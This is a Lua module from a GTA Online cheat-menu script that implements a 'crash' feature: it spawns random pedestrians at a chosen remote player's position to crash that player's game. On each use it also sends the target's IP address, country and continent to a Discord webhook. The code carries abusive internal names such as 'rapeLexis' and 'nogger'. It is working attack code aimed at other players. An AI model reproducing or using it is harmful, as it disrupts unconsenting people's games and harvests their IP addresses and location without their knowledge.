local function createRandomPedCrashToggleModule(moduleContext)
    if type(moduleContext) ~= "table" or not moduleContext then
        moduleContext = {}
    end
    local reportTerminalViolation = moduleContext.KSRuntimeTerminalViolation
    if type(reportTerminalViolation) ~= "function" then
        error("player-feature terminal violation context invalid", 2)
    end

    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local function runRandomPedCrashToggle(playerFeature)
        if playerFeature == nil or not playerFeature:IsToggled() then
            return false
        end
        local targetPlayerId = playerFeature:GetPlayerIndex()
        local function disableFeature()
            playerFeature:SetValue(false)
            playerFeature:OnClick()
        end
        if type(targetPlayerId) ~= "number" or targetPlayerId == GTA.GetLocalPlayerId() or not (isDev or isSupporter or isAdmin) then
            disableFeature()
            return false
        end
        if onCrashCooldown and not isDev then
            notify("Another Crash is running, please wait for it to Finish!")
            disableFeature()
            return false
        end
        local spawnedPeds = {}
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            disableFeature()
            return false
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if not targetGamerInfo then
            disableFeature()
            return false
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                disableFeature()
                return false
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" then
            if not isDev then
                blacklistSound("forbidden_protected_runtime_target")
                SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                disableFeature()
                return false
            end
        end

        local targetTags = tostring(Players.GetTags(targetPlayerId) or "")
        local isTargetFriend = string.find(targetTags, "[F]", 1, true) ~= nil
        local targetName = tostring(Players.GetName(targetPlayerId) or "Unknown")
        local function logFeatureUse()
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetCountry = targetIpInfo and targetIpInfo.country or "Unknown"
            local targetContinent = targetIpInfo and targetIpInfo.continent or "Unknown"
            local targetIp = Players.GetIP(targetPlayerId)
            local targetIpAddress = targetIp and targetIp:ToString(false) or "Unknown"
            SendToDiscord("lol", ("%s used BLDM Crash against %s with UID %i, isSupporter %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()), targetName, Cherax.GetUID(),
                tostring(isSupporter), tostring(isTargetFriend), tostring(targetCountry),
                tostring(targetContinent), tostring(targetIpAddress)
            ))
        end
        Script.QueueJob(logFeatureUse)
        if isTargetFriend and not isDev then
            reportTerminalViolation("forbidden_friend_target")
            disableFeature()
            return false
        end
        onCrashCooldown = true
        for spawnIndex = 0, 5 do
            local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetPlayerId)
            local targetX, targetY, targetZ = ENTITY.GET_ENTITY_COORDS(targetPed, true)
            local spawnedPed = GTA.CreateRandomPed(targetX, targetY, targetZ)
            if type(spawnedPed) == "number" and spawnedPed ~= 0 then
                table.insert(spawnedPeds, spawnedPed)
            end
            Script.Yield(100)
        end
        while playerFeature:IsToggled() do
            Script.Yield(100)
        end
        onCrashCooldown = false
        for pedIndex = 1, #spawnedPeds do
            DeleteEnt(spawnedPeds[pedIndex])
            Script.Yield(10)
        end
    end

    local randomPedCrashToggleRunner = { variant = "donator", feature = "rapeLexis", slug = "rapelexis" }

    function randomPedCrashToggleRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runRandomPedCrashToggle(runContext.feature)
    end

    return randomPedCrashToggleRunner
end

return createRandomPedCrashToggleModule
